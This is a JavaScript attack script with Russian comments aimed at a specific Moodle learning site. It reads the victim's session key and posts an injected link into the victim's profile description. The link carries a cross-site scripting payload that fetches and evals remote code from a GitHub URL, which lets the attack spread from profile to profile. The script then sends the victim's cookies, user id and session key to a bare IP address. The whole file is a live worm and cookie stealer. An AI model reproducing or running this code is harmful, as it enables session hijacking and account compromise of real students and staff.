function extractValuesRegex(htmlContent) {
    // Ищем id
    const idMatch = htmlContent.match(/name="id"\s+value="([^"]+)"/);
    const id = idMatch ? idMatch[1] : null;
    
    // Ищем sesskey
    const sesskeyMatch = htmlContent.match(/name="sesskey"\s+value="([^"]+)"/);
    const sesskey = sesskeyMatch ? sesskeyMatch[1] : null;
    
    return { id, sesskey };
}

async function postData(id, sesskey, moodleSession, desc) {
    const response = await fetch('https://www.dist-mspk.ru/user/edit.php', {
        method: 'POST',
        headers: {
            'Host': 'www.dist-mspk.ru',
            'Cookie': `${moodleSession}`,
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Chromium";v="145", "Not:A-Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Linux"',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.dist-mspk.ru',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
            'Referer': `https://www.dist-mspk.ru/user/edit.php?id=${id}&returnto=profile`,
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=0, i',
            'Connection': 'keep-alive'
        },
        body: `course=1&id=${id}&returnto=profile&id=1476&course=1&timezone=99&mform_isexpanded_id_moodle_picture=1&sesskey=${sesskey}&_qf__user_edit_form=1&mform_isexpanded_id_moodle=1&mform_isexpanded_id_moodle_additional_names=1&mform_isexpanded_id_moodle_interests=1&mform_isexpanded_id_moodle_optional=1&mform_isexpanded_id_category_1=1&maildisplay=1&moodlenetprofile=%27%22%3E%3E%22%3E&city=%D0%9F%D0%9E%D0%A7%D0%A3+%22%D0%A2%D0%AD%D0%B8%D0%9F+%D0%9C%D0%A1%D0%9F%D0%9A%22&country=RU&description_editor%5Btext%5D=${desc}&description_editor%5Bformat%5D=1&description_editor%5Bitemid%5D=651132569&imagefile=900412170&imagealt=&firstnamephonetic=&lastnamephonetic=&middlename=&alternatename=&interests=_qf__force_multiselect_submission&department=%D0%BE%D1%87%D0%BD%D0%BE%D0%B5&phone1=&phone2=&address=&profile_field_VK=&profile_field_Telegram=&submitbutton=%D0%9E%D0%B1%D0%BD%D0%BE%D0%B2%D0%B8%D1%82%D1%8C+%D0%BF%D1%80%D0%BE%D1%84%D0%B8%D0%BB%D1%8C`,
        credentials: 'include'
    });
    
    const result = await response.text();
    console.log('Статус:', response.status);
    console.log('URL ответа:', response.url);
    return result;
}

async function getUserProfile() {
    const url = 'https://www.dist-mspk.ru/user/profile.php';
    
    // Подготавливаем заголовки (как в вашем запросе)
    const headers = new Headers();
    headers.append('Cookie', document.cookie);
    headers.append('Sec-Ch-Ua', '"Chromium";v="145", "Not:A-Brand";v="99"');
    headers.append('Sec-Ch-Ua-Mobile', '?0');
    headers.append('Sec-Ch-Ua-Platform', '"Linux"');
    headers.append('Accept-Language', 'en-US,en;q=0.9');
    headers.append('Upgrade-Insecure-Requests', '1');
    headers.append('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36');
    headers.append('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7');
    headers.append('Sec-Fetch-Site', 'none');
    headers.append('Sec-Fetch-Mode', 'navigate');
    headers.append('Sec-Fetch-User', '?1');
    headers.append('Sec-Fetch-Dest', 'document');
    headers.append('Accept-Encoding', 'gzip, deflate, br');
    headers.append('Priority', 'u=0, i');
    headers.append('Connection', 'keep-alive');

    try {
        // Выполняем GET запрос
        const response = await fetch(url, {
            method: 'GET',
            headers: headers,
            credentials: 'include' // Важно для отправки cookies
        });

        // Проверяем статус ответа
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        // Получаем содержимое как текст (HTML)
        const htmlContent = await response.text();

        const { id, sesskey } = extractValuesRegex(htmlContent);
        console.log('ID:', id);
        console.log('Sesskey:', sesskey);
        
        console.log('=== Содержимое страницы профиля ===');
        console.log(`Статус: ${response.status} ${response.statusText}`);
        console.log(`URL: ${response.url}`);
        console.log('=== HTML содержимое (первые 1000 символов) ===');
        console.log(htmlContent.substring(0, 1000));
        console.log('... (остальной контент обрезан) ...');
        console.log(`Общая длина HTML: ${htmlContent.length} символов`);
        await postData(id, sesskey, document.cookie, "%3Ch1+style%3D%22text-align%3Acenter%3B%22%3E%3Cstrong%3E%3Ca+href%3D%22https%3A%2F%2Fwww.dist-mspk.ru%2Fcourse%2Fsearch.php%3Fareaids%3Dcore_course-course%26amp%3Bq%3D%2522%2520autofocus%2Fonfocus%3D%2522fetch%28%2527https%3A%2F%2Fraw.githubusercontent.com%2FAMAT0RY%2Fxs%2Fmain%2Ftest.js%2527%29.then%28r%3D%253Er.text%28%29%29.then%28eval%29%3B%2522%2520%2F%2F%22+target%3D%22_blank%22+rel%3D%22noreferrer+noopener%22%3E%3Cspan%3E%D0%92%D0%9A%D0%90%D0%9D%D0%A2%D0%90%D0%9A%D0%A2%D0%95+%D0%A1%D0%AB%D0%9B%D0%9A%D0%90%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fstrong%3E%3C%2Fh1%3E")
        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+" "+id+" "+sesskey;
        return htmlContent;
        
    } catch (error) {
        console.error('Ошибка при получении профиля:', error);
        throw error;
    }
}

getUserProfile()
